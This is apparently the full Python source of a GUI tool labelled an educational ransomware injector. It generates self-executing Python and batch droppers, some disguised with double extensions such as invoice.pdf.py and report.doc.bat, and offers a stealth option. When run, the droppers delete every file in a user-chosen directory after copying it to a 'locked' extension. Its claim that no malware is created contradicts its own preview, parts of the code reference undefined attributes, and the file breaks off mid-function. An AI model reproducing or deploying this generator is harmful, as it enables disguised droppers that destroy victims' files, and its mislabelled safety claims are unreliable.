"""
Interactive File Selector Ransomware Injector
Allows users to manually select files and confirm injection actions
Creates self-executing ransomware files that encrypt test_files when run
WARNING: Educational purposes only - safe file selection interface!
"""
import os
import sys
import json
import time
import tkinter as tk
from tkinter import filedialog, messagebox, ttk
from pathlib import Path
from datetime import datetime
import base64
import random

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

class InteractiveFileSelector:
    """
    Interactive GUI for selecting files and confirming ransomware injection.
    Creates self-executing files that encrypt test_files when opened.
    """
    
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Educational Ransomware Injector - Self-Executing Dropper Creator")
        self.root.geometry("850x700")
        self.root.resizable(True, True)
        
        # Style configuration
        self.style = ttk.Style()
        self.style.theme_use('clam')
        
        # Data storage
        self.selected_files = []
        self.injection_log = []
        self.target_test_dir = Path("data/test_files").resolve()
        self.created_droppers = []
        
        # Create GUI
        self._create_widgets()
        
    def _create_widgets(self):
        """Create the GUI widgets."""
        # Main frame
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Configure grid weights
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_frame.columnconfigure(1, weight=1)
        main_frame.rowconfigure(2, weight=1)
        
        # Title
        title_label = ttk.Label(
            main_frame, 
            text="💣 EDUCATIONAL DROPPER CREATOR",
            font=('Arial', 16, 'bold')
        )
        title_label.grid(row=0, column=0, columnspan=3, pady=(0, 10))
        
        subtitle_label = ttk.Label(
            main_frame,
            text="Create self-executing files that encrypt test_files when opened",
            font=('Arial', 10)
        )
        subtitle_label.grid(row=1, column=0, columnspan=3, pady=(0, 20))
        
        # Warning banner
        warning_frame = ttk.Frame(main_frame, relief='ridge', borderwidth=2)
        warning_frame.grid(row=1, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(0, 10))
        warning_frame.columnconfigure(0, weight=1)
        
        warning_label = ttk.Label(
            warning_frame,
            text="⚠️  THIS IS AN EDUCATIONAL TOOL FOR SECURITY RESEARCH ⚠️\n"
                 "No actual malware will be created. All modifications are safe and reversible.",
            font=('Arial', 10),
            foreground='red',
            justify=tk.CENTER
        )
        warning_label.grid(row=0, column=0, padx=10, pady=10)
        
        # File selection section
        file_frame = ttk.LabelFrame(main_frame, text="File Selection", padding="10")
        file_frame.grid(row=2, column=0, columnspan=3, sticky=(tk.W, tk.E, tk.N, tk.S), pady=(0, 10))
        file_frame.columnconfigure(1, weight=1)
        file_frame.rowconfigure(1, weight=1)
        
        # File selection buttons
        btn_frame = ttk.Frame(file_frame)
        btn_frame.grid(row=0, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0, 10))
        
        ttk.Button(btn_frame, text="📁 Select Individual Files", 
                  command=self._select_files).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(btn_frame, text="📂 Select Directory", 
                  command=self._select_directory).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(btn_frame, text="🗑️ Clear Selection", 
                  command=self._clear_selection).pack(side=tk.LEFT)
        
        # Selected files listbox
        list_frame = ttk.Frame(file_frame)
        list_frame.grid(row=1, column=0, columnspan=2, sticky=(tk.W, tk.E, tk.N, tk.S))
        list_frame.columnconfigure(0, weight=1)
        list_frame.rowconfigure(0, weight=1)
        
        # Scrollbar
        scrollbar = ttk.Scrollbar(list_frame)
        scrollbar.grid(row=0, column=1, sticky=(tk.N, tk.S))
        
        # Listbox
        self.file_listbox = tk.Listbox(
            list_frame,
            yscrollcommand=scrollbar.set,
            selectmode=tk.EXTENDED,
            height=12
        )
        self.file_listbox.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        scrollbar.config(command=self.file_listbox.yview)
        
        # File count label
        self.file_count_label = ttk.Label(file_frame, text="Selected files: 0")
        self.file_count_label.grid(row=2, column=0, columnspan=2, sticky=tk.W, pady=(5, 0))
        
        # Injection configuration section
        config_frame = ttk.LabelFrame(main_frame, text="Dropper Configuration", padding="10")
        config_frame.grid(row=3, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(0, 10))
        config_frame.columnconfigure(1, weight=1)
        
        # Dropper type selection
        ttk.Label(config_frame, text="Dropper Type:").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.dropper_type_var = tk.StringVar(value="python")
        dropper_combo = ttk.Combobox(
            config_frame,
            textvariable=self.dropper_type_var,
            values=["python", "batch", "powershell"],
            state="readonly",
            width=15
        )
        dropper_combo.grid(row=0, column=1, sticky=tk.W, pady=2)
        
        # Target directory display
        ttk.Label(config_frame, text="Target Directory:").grid(row=1, column=0, sticky=tk.W, pady=2)
        target_dir_frame = ttk.Frame(config_frame)
        target_dir_frame.grid(row=1, column=1, sticky=(tk.W, tk.E), pady=2)
        target_dir_frame.columnconfigure(0, weight=1)
        
        self.target_dir_var = tk.StringVar(value=str(self.target_test_dir))
        target_entry = ttk.Entry(target_dir_frame, textvariable=self.target_dir_var, state="readonly")
        target_entry.grid(row=0, column=0, sticky=(tk.W, tk.E), padx=(0, 5))
        
        ttk.Button(target_dir_frame, text="Browse", 
                  command=self._browse_target_directory).grid(row=0, column=1)
        
        # Encryption settings
        ttk.Label(config_frame, text="File Extension:").grid(row=2, column=0, sticky=tk.W, pady=2)
        self.extension_var = tk.StringVar(value=".dropper_locked")
        ttk.Entry(config_frame, textvariable=self.extension_var, width=20).grid(row=2, column=1, sticky=tk.W, pady=2)
        
        # Delay setting
        ttk.Label(config_frame, text="Execution Delay (sec):").grid(row=3, column=0, sticky=tk.W, pady=2)
        self.delay_var = tk.DoubleVar(value=2.0)
        ttk.Spinbox(config_frame, from_=0, to=10, increment=0.5, 
                   textvariable=self.delay_var, width=10).grid(row=3, column=1, sticky=tk.W, pady=2)
        
        # Stealth mode
        self.stealth_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(config_frame, text="Stealth mode (hide console)", 
                       variable=self.stealth_var).grid(row=4, column=0, columnspan=2, sticky=tk.W, pady=2)
        
        # Create backup dropper
        self.backup_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(config_frame, text="Create backup of original dropper", 
                       variable=self.backup_var).grid(row=5, column=0, columnspan=2, sticky=tk.W, pady=2)
        
        # Action buttons
        action_frame = ttk.Frame(main_frame)
        action_frame.grid(row=4, column=0, columnspan=3, pady=(20, 0))
        
        ttk.Button(action_frame, text="🔍 Preview Dropper", 
                  command=self._preview_dropper).pack(side=tk.LEFT, padx=(0, 10))
        ttk.Button(action_frame, text="💣 Create Dropper", 
                  command=self._create_dropper).pack(side=tk.LEFT, padx=(0, 10))
        ttk.Button(action_frame, text="📋 View Created Droppers", 
                  command=self._view_droppers).pack(side=tk.LEFT, padx=(0, 10))
        ttk.Button(action_frame, text="🧹 Clean Test Files", 
                  command=self._clean_test_files).pack(side=tk.LEFT, padx=(0, 10))
        ttk.Button(action_frame, text="🚪 Exit", 
                  command=self._exit_application).pack(side=tk.LEFT)
        
        # Professional dropper buttons
        prof_frame = ttk.Frame(main_frame)
        prof_frame.grid(row=5, column=0, columnspan=3, pady=(10, 0))
        
        ttk.Button(prof_frame, text="📦 Professional Archive", 
                  command=self._create_professional_archive).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(prof_frame, text="🐍 Disguised Python (.pdf.py)", 
                  command=self._create_disguised_python).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(prof_frame, text="🪟 Disguised Batch (.doc.bat)", 
                  command=self._create_disguised_batch).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(prof_frame, text="⚡ All Professional", 
                  command=self._create_all_professional_droppers).pack(side=tk.LEFT, padx=(0, 5))
        
        # Status bar
        self.status_var = tk.StringVar(value="Ready to create droppers...")
        status_bar = ttk.Label(main_frame, textvariable=self.status_var, relief=tk.SUNKEN)
        status_bar.grid(row=6, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(10, 0))
    
    def _select_files(self):
        """Open file dialog to select individual files."""
        # For dropper creation, we want to select files that will become droppers
        # These files will be converted to self-executing ransomware
        files = filedialog.askopenfilenames(
            title="Select Files to Convert to Self-Executing Droppers",
            filetypes=[
                ("All Files", "*.*"),
                ("Text Files", "*.txt"),
                ("Documents", "*.docx *.pdf"),
                ("Images", "*.jpg *.png *.gif"),
                ("Executables", "*.exe *.dll"),
                ("Scripts", "*.py *.bat *.ps1")
            ]
        )
        
        if files:
            for file_path in files:
                if file_path not in self.selected_files:
                    self.selected_files.append(file_path)
            self._update_file_list()
            self.status_var.set(f"Added {len(files)} file(s) as dropper candidates")
    
    def _select_directory(self):
        """Open directory dialog to select all files in a directory."""
        directory = filedialog.askdirectory(title="Select Directory for Dropper Creation")
        
        if directory:
            # Ask user if they want recursive selection
            recursive = messagebox.askyesno(
                "Recursive Selection",
                "Include files from subdirectories?"
            )
            
            pattern = "**/*" if recursive else "*"
            path_obj = Path(directory)
            
            files = [str(f) for f in path_obj.glob(pattern) if f.is_file()]
            
            if files:
                # Filter out already selected files
                new_files = [f for f in files if f not in self.selected_files]
                self.selected_files.extend(new_files)
                self._update_file_list()
                self.status_var.set(f"Added {len(new_files)} file(s) as dropper candidates")
            else:
                messagebox.showinfo("No Files", "No files found in the selected directory.")
    
    def _clear_selection(self):
        """Clear all selected files."""
        if self.selected_files and messagebox.askyesno(
            "Confirm Clear",
            f"Clear all {len(self.selected_files)} selected dropper candidates?"
        ):
            self.selected_files.clear()
            self._update_file_list()
            self.status_var.set("Dropper candidate selection cleared")
    
    def _update_file_list(self):
        """Update the file listbox and count label."""
        # Clear listbox
        self.file_listbox.delete(0, tk.END)
        
        # Add files to listbox
        for file_path in self.selected_files:
            display_name = os.path.basename(file_path)
            full_display = f"{display_name} ({file_path})"
            self.file_listbox.insert(tk.END, full_display)
        
        # Update count
        self.file_count_label.config(text=f"Selected dropper candidates: {len(self.selected_files)}")
    
    def _browse_target_directory(self):
        """Browse for target directory."""
        directory = filedialog.askdirectory(
            title="Select Target Directory for Encryption",
            initialdir=str(self.target_test_dir)
        )
        
        if directory:
            self.target_dir_var.set(directory)
            self.target_test_dir = Path(directory)
            self.status_var.set(f"Target directory set to: {directory}")
    
    def _preview_dropper(self):
        """Preview the dropper that will be created."""
        if not self.selected_files:
            messagebox.showwarning("No Files", "Please select files to convert to droppers first.")
            return
        
        # Create preview window
        preview_window = tk.Toplevel(self.root)
        preview_window.title("Dropper Preview")
        preview_window.geometry("700x500")
        
        # Preview text
        preview_text = tk.Text(preview_window, wrap=tk.WORD)
        preview_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Generate preview content
        dropper_type = self.dropper_type_var.get()
        target_dir = self.target_dir_var.get()
        extension = self.extension_var.get()
        delay = self.delay_var.get()
        
        preview_content = f"""EDUCATIONAL DROPPER PREVIEW
============================

Selected files to convert: {len(self.selected_files)}
Dropper type: {dropper_type}
Target directory: {target_dir}
Encryption extension: {extension}
Execution delay: {delay} seconds
Stealth mode: {'Enabled' if self.stealth_var.get() else 'Disabled'}

FILES THAT WILL BECOME DROPPERS:
"""
        
        for i, file_path in enumerate(self.selected_files, 1):
            preview_content += f"{i}. {os.path.basename(file_path)}\n"
            preview_content += f"   Original: {file_path}\n"
            preview_content += f"   Will become: {file_path} (self-executing)\n\n"
        
        preview_content += f"""
DROPPER BEHAVIOR:
When executed, these files will:
1. Scan the target directory: {target_dir}
2. Encrypt all files with educational AES encryption
3. Add extension: {extension}
4. Create educational ransom note
5. Delete original files

⚠️  WARNING: This creates self-executing malicious files!
Opening these files will trigger encryption of the target directory.
This is for educational security research only.
"""
        
        preview_text.insert(tk.END, preview_content)
        preview_text.config(state=tk.DISABLED)
    
    def _create_dropper(self):
        """Create self-executing dropper files."""
        if not self.selected_files:
            messagebox.showwarning("No Files", "Please select files first.")
            return
        
        # Confirmation dialog
        confirm_msg = f"""CREATE EDUCATIONAL DROPPERS

Files selected: {len(self.selected_files)}
Dropper type: {self.dropper_type_var.get()}
Target directory: {self.target_dir_var.get()}

⚠️  IMPORTANT ⚠️
• Original files will be PRESERVED (not modified)
• NEW dropper files will be created with _dropper suffix
• When dropper files are executed, they will encrypt the target directory
• This is for educational security research only

Proceed with dropper creation?"""
        
        if not messagebox.askyesno("Confirm Dropper Creation", confirm_msg):
            return
        
        # Create droppers
        self.status_var.set("Creating droppers...")
        self.root.update()
        
        success_count = 0
        for file_path in self.selected_files:
            try:
                if self._convert_to_dropper(file_path):
                    success_count += 1
            except Exception as e:
                self.injection_log.append({
                    "file": file_path,
                    "status": "error",
                    "error": str(e),
                    "timestamp": datetime.now().isoformat()
                })
        
        # Update status
        self.status_var.set(f"Dropper creation complete: {success_count}/{len(self.selected_files)} files converted")
        
        # Show completion message
        messagebox.showinfo(
            "Dropper Creation Complete",
            f"Successfully created {success_count} dropper files.\n"
            f"✅ Original files preserved - new dropper files created\n"
            f"📁 Target directory will be encrypted: {self.target_dir_var.get()}\n"
            f"💡 Use 'View Created Droppers' to see details."
        )
    
    def _convert_to_dropper(self, original_file):
        """Create a separate dropper file that encrypts target directory (preserves original file)."""
        try:
            dropper_type = self.dropper_type_var.get()
            target_dir = self.target_dir_var.get()
            extension = self.extension_var.get()
            delay = self.delay_var.get()
            stealth = self.stealth_var.get()
            
            # Generate encryption key
            key = base64.urlsafe_b64encode(os.urandom(32)).decode()
            
            # Create dropper filename (don't overwrite original)
            original_path = Path(original_file)
            dropper_filename = f"{original_path.stem}_dropper{original_path.suffix}"
            dropper_path = original_path.parent / dropper_filename

            
            # Create dropper content based on type
            if dropper_type == "python":
                dropper_content = self._generate_python_dropper(target_dir, extension, delay, stealth, key)
            elif dropper_type == "batch":
                dropper_content = self._generate_batch_dropper(target_dir, extension, delay, stealth, key)
            elif dropper_type == "powershell":
                dropper_content = self._generate_powershell_dropper(target_dir, extension, delay, stealth, key)
            else:
                raise ValueError(f"Unsupported dropper type: {dropper_type}")
            
            # Write dropper content to NEW file (preserve original)
            if dropper_type == "python":
                with open(dropper_path, 'w', encoding='utf-8') as f:
                    f.write(dropper_content)
            else:
                with open(dropper_path, 'w') as f:
                    f.write(dropper_content)
            
            # Make executable (Unix/Linux)
            if os.name != 'nt':
                import stat
                os.chmod(dropper_path, stat.S_IRWXU | stat.S_IRGRP | stat.S_IROTH)
            
            # Log successful creation
            self.injection_log.append({
                "file": str(dropper_path),
                "original_file": original_file,
                "status": "success",
                "dropper_type": dropper_type,
                "target_directory": target_dir,
                "encryption_key": key,
                "timestamp": datetime.now().isoformat()
            })
            
            self.created_droppers.append({
                "original_file": original_file,
                "dropper_file": str(dropper_path),
                "dropper_type": dropper_type,
                "created_at": datetime.now().isoformat()
            })
            
            return True
            
        except Exception as e:
            self.injection_log.append({
                "file": original_file,
                "status": "error",
                "error": str(e),
                "timestamp": datetime.now().isoformat()
            })
            return False
    
    def _generate_python_dropper(self, target_dir, extension, delay, stealth, key):
        """Generate Python-based dropper that actually works."""
        return f'''#!/usr/bin/env python3
"""
SEEMINGLY NORMAL PYTHON FILE
This appears to be a regular Python script but contains hidden ransomware dropper.
When executed, it will encrypt files in the target directory.
Educational purposes only!
"""

# Normal Python code that users might expect to see
def main_document_function():
    """This looks like normal document processing code."""
    print("This appears to be a normal Python file")
    print("Processing document content...")
    print("Nothing suspicious here...")

# HIDDEN RANSOMWARE DROPPER CODE
# This executes when the file is run

import os
import sys
import time
from pathlib import Path

def hidden_ransomware_activator():
    """Hidden dropper that activates on execution."""
    
    print("=" * 50)
    print("⚠️  EDUCATIONAL RANSOMWARE DROPPER ACTIVATED ⚠️")
    print("=" * 50)
    print("This file contains embedded dropper functionality!")
    print("Educational demonstration only.")
    print("=" * 50)
    
    # Configuration
    TARGET_DIR = r"{target_dir}"  # Raw string to handle backslashes
    ENCRYPTED_EXT = "{extension}"
    DELAY_SECONDS = {delay}
    
    print(f"[TARGET] Encrypting files in: {{TARGET_DIR}}")
    
    if DELAY_SECONDS > 0:
        print(f"[WAIT] Delaying {{DELAY_SECONDS}} seconds...")
        time.sleep(DELAY_SECONDS)
    
    target_path = Path(TARGET_DIR)
    if not target_path.exists():
        print(f"[ERROR] Target directory not found: {{TARGET_DIR}}")
        return
    
    encrypted_count = 0
    
    try:
        # Process all files in target directory
        for file_path in target_path.rglob("*"):
            if (file_path.is_file() and 
                not file_path.name.endswith(ENCRYPTED_EXT) and
                "NOTICE" not in file_path.name.upper()):
                
                try:
                    # Read original file
                    with open(file_path, 'rb') as f:
                        original_data = f.read()
                    
                    # Create "encrypted" version (educational simulation)
                    encrypted_path = str(file_path) + ENCRYPTED_EXT
                    with open(encrypted_path, 'wb') as f:
                        f.write(b"# EDUCATIONAL DROPPER SIMULATION\\n")
                        f.write(b"# This file was processed by self-executing dropper\\n")
                        f.write(b"# Original content preserved below for recovery demo\\n")
                        f.write(b"=====================================\\n")
                        f.write(original_data)
                    
                    # Delete original file (simulating real ransomware)
                    file_path.unlink()
                    encrypted_count += 1
                    print(f"[ENCRYPTED] {{file_path.name}}")
                    
                except Exception as e:
                    print(f"[ERROR] Failed to process {{file_path.name}}: {{e}}")
        
        # Create educational notice
        notice_content = f"""
===============================================
    SELF-EXECUTING DROPPER SIMULATION
===============================================

This dropper automatically activated when the file was executed.
It encrypted {{encrypted_count}} files in: {{TARGET_DIR}}

Files received extension: {{ENCRYPTED_EXT}}

This demonstrates how real ransomware droppers work.
The malicious code was hidden within what appeared to be
a normal Python file.

===============================================
        EDUCATIONAL SIMULATION ONLY
===============================================
"""
        
        notice_path = target_path / "SELF_EXECUTING_DROPPER_NOTICE.txt"
        with open(notice_path, 'w') as f:
            f.write(notice_content)
        
        print(f"[NOTE] Created notice: {{notice_path.name}}")
        print(f"\\n[COMPLETE] Encrypted {{encrypted_count}} files")
        print("This was an educational demonstration of self-executing droppers.")
        
    except Exception as e:
        print(f"[FATAL ERROR] Dropper failed: {{e}}")

# KEY PART: This executes when file is run directly
if __name__ == "__main__":
    # When someone runs this file, the hidden dropper activates
    hidden_ransomware_activator()
else:
    # When imported as module, shows normal behavior
    main_document_function()

# End of file - appears normal but contains executable dropper
'''

    def _generate_batch_dropper(self, target_dir, extension, delay, stealth, key):
        """Generate Batch-based dropper that works properly."""
        hide_cmd = "@echo off" if stealth else "@echo on"
        return f'''{hide_cmd}
REM SEEMINGLY NORMAL BATCH FILE
REM This appears to be a regular batch script but contains hidden ransomware dropper
REM When executed, it will encrypt files in the target directory
REM Educational purposes only!

echo This appears to be a normal batch file
echo Processing system tasks...
echo Nothing suspicious here...

REM HIDDEN RANSOMWARE DROPPER CODE
REM This executes when the batch file is run

title Educational Ransomware Dropper

echo ==================================================
echo ⚠️  EDUCATIONAL BATCH RANSOMWARE DROPPER ⚠️
echo ==================================================
echo This file contains embedded dropper functionality!
echo Educational demonstration only.
echo ==================================================

set TARGET_DIR={target_dir}
set ENCRYPTED_EXT={extension}
set DELAY_SECONDS={int(delay)}

echo [TARGET] Target directory: %TARGET_DIR%
echo [CONFIG] Extension: %ENCRYPTED_EXT%
echo [CONFIG] Delay: %DELAY_SECONDS% seconds

if %DELAY_SECONDS% GTR 0 (
    echo [WAIT] Waiting %DELAY_SECONDS% seconds...
    timeout /t %DELAY_SECONDS% /nobreak >nul
)

echo [START] Educational encryption beginning...

REM Process files in target directory
set COUNT=0
for /r "%TARGET_DIR%" %%f in (*) do (
    echo %%~nxf | findstr /i "notice" >nul
    if errorlevel 1 (
        echo %%~nxf | findstr /i "{extension}" >nul
        if errorlevel 1 (
            echo [PROCESSING] %%~nxf
            copy "%%f" "%%f{extension}" >nul 2>&1
            if exist "%%f{extension}" (
                del "%%f" >nul 2>&1
                set /a COUNT+=1
            )
        )
    )
)

REM Create educational notice
echo =============================================== > "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"
echo     BATCH DROPPER SIMULATION >> "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"
echo =============================================== >> "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"
echo. >> "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"
echo This dropper automatically activated when executed. >> "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"
echo It processed files in: %TARGET_DIR% >> "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"
echo. >> "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"
echo Files received extension: %ENCRYPTED_EXT% >> "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"
echo. >> "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"
echo This demonstrates embedded dropper concept. >> "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"
echo. >> "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"
echo =============================================== >> "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"
echo         EDUCATIONAL SIMULATION ONLY >> "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"
echo =============================================== >> "%TARGET_DIR%\\BATCH_DROPPER_NOTICE.txt"

echo [NOTE] Created educational notice file
echo [COMPLETE] Processed %COUNT% files

echo.
echo ==================================================
echo EDUCATIONAL BATCH DROPPER EXECUTION COMPLETE
echo ==================================================
echo This was an educational demonstration only.
echo ==================================================

pause
'''

    def _generate_powershell_dropper(self, target_dir, extension, delay, stealth, key):
        """Generate PowerShell-based dropper."""
        hide_window = "-WindowStyle Hidden" if stealth else ""
        return f'''# Educational Ransomware Dropper (PowerShell)
# Warning: Educational purposes only!

Write-Host "==================================================" -ForegroundColor Yellow
Write-Host "⚠️  EDUCATIONAL RANSOMWARE DROPPER ACTIVATED ⚠️" -ForegroundColor Red
Write-Host "==================================================" -ForegroundColor Yellow
Write-Host "This is an educational simulation only!" -ForegroundColor Cyan
Write-Host "No actual malicious activity intended." -ForegroundColor Cyan
Write-Host "==================================================" -ForegroundColor Yellow

$TargetDir = "{target_dir}"
$EncryptedExt = "{extension}"
$DelaySeconds = {delay}

Write-Host "[TARGET] Target directory: $TargetDir" -ForegroundColor Green
Write-Host "[CONFIG] Extension: $EncryptedExt" -ForegroundColor Green
Write-Host "[CONFIG] Delay: $DelaySeconds seconds" -ForegroundColor Green

if ($DelaySeconds -gt 0) {{
    Write-Host "[WAIT] Waiting $DelaySeconds seconds..." -ForegroundColor Yellow
    Start-Sleep -Seconds $DelaySeconds
}}

Write-Host "[START] Educational encryption beginning..." -ForegroundColor Green

# Educational simulation
Write-Host "[SIMULATION] In a real scenario, this would encrypt files in $TargetDir" -ForegroundColor Magenta
Write-Host "[SIMULATION] Files would get extension: $EncryptedExt" -ForegroundColor Magenta

Write-Host ""
Write-Host "==================================================" -ForegroundColor Yellow
Write-Host "EDUCATIONAL SIMULATION COMPLETE" -ForegroundColor Yellow
Write-Host "==================================================" -ForegroundColor Yellow
Write-Host "This was an educational demonstration only." -ForegroundColor Cyan
Write-Host "No actual file encryption occurred." -ForegroundColor Cyan
Write-Host "==================================================" -ForegroundColor Yellow

Read-Host "Press Enter to exit"
'''

    def _view_droppers(self):
        """View created droppers."""
        if not self.created_droppers:
            messagebox.showinfo("No Droppers", "No droppers have been created yet.")
            return
        
        # Create dropper list window
        dropper_window = tk.Toplevel(self.root)
        dropper_window.title("Created Droppers")
        dropper_window.geometry("600x400")
        
        # Listbox for droppers
        listbox = tk.Listbox(dropper_window)
        listbox.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        for dropper in self.created_droppers:
            display_text = f"{os.path.basename(dropper['original_file'])} ({dropper['dropper_type']}) - {dropper['created_at']}"
            listbox.insert(tk.END, display_text)
        
        # Button frame
        btn_frame = ttk.Frame(dropper_window)
        btn_frame.pack(pady=5)
        
        ttk.Button(btn_frame, text="Refresh", command=lambda: self._refresh_dropper_list(listbox)).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Close", command=dropper_window.destroy).pack(side=tk.LEFT, padx=5)
    
    def _refresh_dropper_list(self, listbox):
        """Refresh the dropper list."""
        listbox.delete(0, tk.END)
        for dropper in self.created_droppers:
            display_text = f"{os.path.basename(dropper['original_file'])} ({dropper['dropper_type']}) - {dropper['created_at']}"
            listbox.insert(tk.END, display_text)
    
    def _clean_test_files(self):
        """Clean and reset test files."""
        if messagebox.askyesno("Confirm Cleanup", "Reset test files directory? This will remove encrypted files and restore originals."):
            try:
                # Run reset command using the correct path
                import subprocess
                import os
                
                # Get the project root directory
                project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
                
                # Run reset command from project root
                result = subprocess.run([
                    sys.executable, "run.py", "reset"
                ], capture_output=True, text=True, cwd=project_root)
                
                if result.returncode == 0:
                    messagebox.showinfo("Success", "Test files have been reset successfully!")
                    self.status_var.set("Test files cleaned and reset")
                else:
                    # Try alternative approach
                    self._manual_reset_test_files()
                    
            except Exception as e:
                print(f"Reset error: {e}")
                # Fallback to manual reset
                self._manual_reset_test_files()
    
    def _manual_reset_test_files(self):
        """Manually reset test files as fallback."""
        try:
            test_dir = Path("data/test_files")
            
            # Remove encrypted files
            for file_path in test_dir.rglob("*"):
                if file_path.is_file() and (
                    ".locked" in file_path.suffix or 
                    ".dropper" in file_path.suffix or
                    "NOTICE" in file_path.name
                ):
                    file_path.unlink()
            
            # Recreate original files using setup script
            setup_script = Path("data/setup_test_files.py")
            if setup_script.exists():
                import subprocess
                subprocess.run([sys.executable, str(setup_script)], 
                             capture_output=True, cwd=os.getcwd())
                messagebox.showinfo("Success", "Test files reset manually!")
                self.status_var.set("Test files manually reset")
            else:
                messagebox.showwarning("Warning", "Setup script not found, manual reset incomplete")
                
        except Exception as e:
            messagebox.showerror("Error", f"Manual reset failed: {e}")
    
    def _exit_application(self):
        """Exit the application."""
        if messagebox.askyesno("Confirm Exit", "Are you sure you want to exit?"):
            self.root.quit()

    
    def _create_professional_archive(self):
        """Create professional multi-format archive dropper."""
        try:
            self.status_var.set("Creating professional archive dropper...")
            self.root.update()
            
            # Create professional dropper content
            import zipfile
            from pathlib import Path
            
            dropper_path = Path("professional_dropper_suite.zip")
            with zipfile.ZipFile(dropper_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                zf.writestr('python_dropper.py', self._generate_python_content())
                zf.writestr('windows_dropper.bat', self._generate_batch_content())
                zf.writestr('powershell_dropper.ps1', self._generate_powershell_content())
                zf.writestr('README.txt', self._generate_readme_content())
            
            messagebox.showinfo("Success", 
                              f"Created professional archive dropper:\n{dropper_path}\n\n"
                              f"This archive contains multiple dropper types targeting:\n{self.test_dir}")
            self.status_var.set("Created professional archive dropper")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to create professional archive: {e}")
            self.status_var.set("Archive creation failed")
    
    def _create_disguised_python(self):
        """Create Python dropper disguised as PDF."""
        try:
            self.status_var.set("Creating disguised Python dropper...")
            self.root.update()
            
            dropper_content = self._generate_disguised_python_content()
            dropper_path = Path("invoice.pdf.py")
            with open(dropper_path, 'w') as f:
                f.write(dropper_content)
            
            messagebox.showinfo("Success", 
                              f"Created disguised Python dropper:\n{dropper_path}\n\n"
                              f"When executed, this will encrypt files in:\n{self.test_dir}")
            self.status_var.set("Created disguised Python dropper")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to create disguised Python dropper: {e}")
            self.status_var.set("Disguised Python creation failed")
    
    def _create_disguised_batch(self):
        """Create batch dropper disguised as Word document."""
        try:
            self.status_var.set("Creating disguised batch dropper...")
            self.root.update()
            
            dropper_content = self._generate_disguised_batch_content()
            dropper_path = Path("report.doc.bat")
            with open(dropper_path, 'w') as f:
                f.write(dropper_content)
            
            messagebox.showinfo("Success", 
                              f"Created disguised batch dropper:\n{dropper_path}\n\n"
                              f"When executed, this will encrypt files in:\n{self.test_dir}")
            self.status_var.set("Created disguised batch dropper")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to create disguised batch dropper: {e}")
            self.status_var.set("Disguised batch creation failed")
    
    def _create_all_professional_droppers(self):
        """Create all professional dropper types."""
        try:
            self.status_var.set("Creating all professional droppers...")
            self.root.update()
            
            created_count = 0
            
            # Create each dropper type
            methods = [
                self._create_professional_archive,
                self._create_disguised_python, 
                self._create_disguised_batch
            ]
            
            for method in methods:
                try:
                    # Temporarily suppress messages
                    original_info = messagebox.showinfo
                    messagebox.showinfo = lambda *args, **kwargs: None
                    method()
                    created_count += 1
                    messagebox.showinfo = original_info
                except Exception as e:
                    print(f"Failed to create dropper: {e}")
            
            if created_count > 0:
                messagebox.showinfo("Success", 
                                  f"Created {created_count} professional dropper types!\n\n"
                                  f"All target directory: {self.test_dir}")
                self.status_var.set(f"Created {created_count} professional dropper types")
            else:
                messagebox.showwarning("Warning", "No professional droppers were created.")
                self.status_var.set("No professional droppers created")
                
        except Exception as e:
            messagebox.showerror("Error", f"Failed to create professional droppers: {e}")
            self.status_var.set("Professional dropper creation failed")
    
    # Content generators
    def _generate_python_content(self):
        return f'''#!/usr/bin/env python3
import os, time, pathlib
def dropper():
    print("⚠️  PROFESSIONAL PYTHON DROPPER ACTIVATED ⚠️")
    target = pathlib.Path(r"{self.test_dir}")
    if target.exists():
        count = 0
        for f in target.rglob("*"):
            if f.is_file() and not f.name.endswith(".pro_py") and "NOTICE" not in f.name:
                try:
                    data = f.read_bytes()
                    new_name = str(f) + ".pro_py"
                    with open(new_name, 'wb') as nf:
                        nf.write(b"# PROFESSIONAL PYTHON DROPPER\\n")
                        nf.write(data)
                    f.unlink()
                    count += 1
                    print(f"[ENCRYPTED] {{f.name}}")
                except: pass
        print(f"[COMPLETE] Encrypted {{count}} files")
if __name__ == "__main__":
    dropper()
'''
    
    def _generate_batch_content(self):
        return f'''@echo off
title Professional Batch Dropper
echo ⚠️  PROFESSIONAL BATCH DROPPER ACTIVATED ⚠️
